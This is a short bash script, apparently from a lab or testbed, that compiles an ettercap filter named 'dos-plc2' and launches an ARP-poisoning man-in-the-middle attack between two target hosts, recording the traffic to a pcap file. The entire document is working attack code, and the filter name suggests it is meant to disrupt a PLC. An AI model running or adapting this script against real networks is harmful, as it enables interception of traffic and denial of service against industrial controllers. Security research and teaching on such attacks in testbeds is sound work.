#!/bin/bash

# $1 first target IPv4
# $2 second target IPv4
# $3 attacker sniffing interface

# Go to the directory of the script
cd "$(dirname -- "$0")" || exit $?

if [[ $# -ne 3 ]]; then
    T1="192.168.1.30"
    T2="192.168.1.20"
    ATT_IFACE="attacker-eth0"
else
    T1="$1"
    T2="$2"
    ATT_IFACE="$3"
fi
PCAP_FILE="arp-mitm-active.pcap"
ETTERFILTER_NAME="dos-plc2"
# log everything in files
#exec >> ../../temp/arppoison-mitm.out 2>> ../../temp/arppoison-mitm.err

# Compile the ettercap filter
if ! etterfilter "$ETTERFILTER_NAME.ecf" -o "$ETTERFILTER_NAME.ef"
then
    echo >&2 "ettercap filter compilation failed with error $?"
    exit 39
fi
echo yes
if ettercap --help |grep -q 'MAC/IP/IPv6/PORT'
then
    ettercap -T -w "$PCAP_FILE" -M arp:remote "/$T1//" "/$T2//" -i "$ATT_IFACE" -F "$ETTERFILTER_NAME.ef"
else
    ettercap -T -w "$PCAP_FILE" -M arp:remote "/$T1/" "/$T2/" -i "$ATT_IFACE" -F "$ETTERFILTER_NAME.ef"
#fi &
fi
echo done
